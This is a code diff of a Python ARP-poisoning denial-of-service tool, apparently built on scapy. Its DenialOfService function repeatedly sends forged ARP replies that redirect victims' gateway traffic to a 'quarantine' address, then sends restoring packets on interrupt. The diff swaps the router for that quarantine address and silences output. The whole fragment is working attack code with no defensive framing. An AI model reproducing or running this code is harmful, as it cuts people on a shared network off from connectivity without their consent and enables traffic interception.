@@ -36,19 +36,19 @@ def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
 	return pkt
 
 
-def DenialOfService(interface, victims, quarantine, verbose):
+def DenialOfService(interface, victims, quarantine, verbosity):
 
 #	victims = getTargets(interface, targetString, 0, verbose, True)
 
-	if router in victims:
-		del victims[router]	#In case router was selected as a victim
-
-	print router
+	#if router in victims:
+	#	del victims[router]	#In case router was selected as a victim
+	qIP = quarantine[0]
+	qMAC = quarantine[1]
 
 	packets = []
 
 	for ip, info in victims.iteritems():
-		packets.append( createPacket(ip,info[0], router, machines[router][0], True) )
+		packets.append( createPacket(ip,info[0], qIP, qMAC, True) )
 
 
 	print("Turn out the lights....")
@@ -56,7 +56,7 @@ def DenialOfService(interface, victims, quarantine, verbose):
 	try:
 		while True:
 			for pkt in packets:
-				sendp(pkt, iface=interface)
+				sendp(pkt, iface=interface, verbose=0)
 				
 			time.sleep(2)
 
@@ -66,11 +66,11 @@ def DenialOfService(interface, victims, quarantine, verbose):
 		healPacks = []
 
 		for ip, info in victims.iteritems():
-			healPacks.append(createPacket(ip,info[0],router,machines[router][0], False))
+			healPacks.append(createPacket(ip,info[0], qIP, qMAC, False))
 
 		for i in range(0, 5):
 			for heal in healPacks:
-				sendp(heal, iface=interface)
+				sendp(heal, iface=interface, verbose=0)
 				
 			time.sleep(1)
 
